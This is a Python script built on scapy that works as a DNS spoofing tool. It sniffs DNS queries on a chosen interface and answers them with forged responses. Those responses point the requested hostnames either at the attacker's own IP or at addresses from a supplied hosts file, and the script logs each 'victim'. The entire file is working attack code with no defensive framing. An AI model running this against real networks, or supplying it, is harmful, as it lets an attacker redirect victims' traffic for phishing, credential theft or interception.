#!/usr/bin/python3
import getopt, sys, os
import scapy.all as scapy
import socket
import fcntl
import struct

class dnspoison():

    def __init__(self, args=sys.argv):
        self._args = args
        self._interface = None
        self._hostname_file = None
        self._expression = None
        try:
            optlist, remaining_args = getopt.getopt(args[1:], 'i:f:')
            for option, argument in optlist:
                if option == '-i':
                    self._interface = argument
                elif option == '-f' :
                    self._hostname_file = argument
                else:
                    assert False, "Unhandled exception"
        except Exception as e:
            print(e)
            self.usage()
            sys.exit(2)

        if len(remaining_args) >= 1:
            self._expression = ' '.join(remaining_args)

        if self._hostname_file:
            self.parse_hostname_file()
        else:
            self._dns_hosts = None

        self.dns_poison_init()


    def dns_poison_init(self):
        self._interface = self._interface if self._interface is not None else scapy.conf.iface
        scapy.sniff(iface=self._interface, filter=self._expression, prn=self.corrupt_packet)

    def corrupt_packet(self, packet):

        ip_header = packet.getlayer(scapy.IP)
        udp_header = packet.getlayer(scapy.UDP)
        dns_header = packet.getlayer(scapy.DNS)

        # if none of these are found then not a packet we can forge DNS for
        if not udp_header or not ip_header or not dns_header:
            return

        # return if not type A DNS packet
        if dns_header.qr != 0 and dns_header.opcode != 0:
            return

        # if lacking query field, we can't forge packet
        if dns_header.qd is None:
            return

        resolving_website = dns_header.qd.qname[:-1]
        fake_ip = None
        resolving_website = str(resolving_website, 'utf-8')

        # if host file not provided
        if self._dns_hosts is None:
            fake_ip = self.get_ip_address(self._interface)
            self.send_corrupt_packet(fake_ip, resolving_website, ip_header, udp_header, dns_header)
            return


        # else loop for the hostname for entry in the host file
        if self._dns_hosts.get(resolving_website):
            fake_ip = self._dns_hosts.get(resolving_website)
            self.send_corrupt_packet(fake_ip, resolving_website, ip_header, udp_header, dns_header)
        else:
            return  # host not found in the pair so do nothing


    def send_corrupt_packet(self, fake_ip, resolving_website, ip_header, udp_header, dns_header):
        print("detected DNS look up for {}".format(resolving_website))
        dns_answer = scapy.DNSRR(rrname=resolving_website + ".",
                                 ttl=330,
                                 type="A",
                                 rclass="IN",
                                 rdata=fake_ip)

        dns_response = scapy.IP(src=ip_header.dst, dst=ip_header.src) / \
                    scapy.UDP(sport=udp_header.dport,
                              dport=udp_header.sport) / \
                    scapy.DNS(
                        id=dns_header.id,
                        qr=1,
                        aa=0,
                        rcode=0,
                        qd=dns_header.qd,
                        an=dns_answer
                    )

        print("Sending back {} as the resolved ip for hostname {} to victim {}".format(
            fake_ip,
            resolving_website,
            ip_header.src
        ))

        scapy.send(dns_response, iface=self._interface)

    def get_ip_address(self, ifname):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        return socket.inet_ntoa(fcntl.ioctl(
            s.fileno(),
            0x8915,  # SIOCGIFADDR
            struct.pack('256s', ifname[:15].encode())
        )[20:24])



    def usage(self):
        print("Usage: {} [-i interface] [-f hostnames] [expression]".format(self._args[0]))

    def parse_hostname_file(self):
        self._dns_hosts = {}
        with open(self._hostname_file, 'r') as file:
            for line in file:
                ip, hostname = line.split()
                self._dns_hosts[hostname] = [ip]


if __name__ == '__main__':
    if os.getuid() != 0:
        print("This program needs root permission\n")
        sys.exit(1)
    dnspoison = dnspoison()


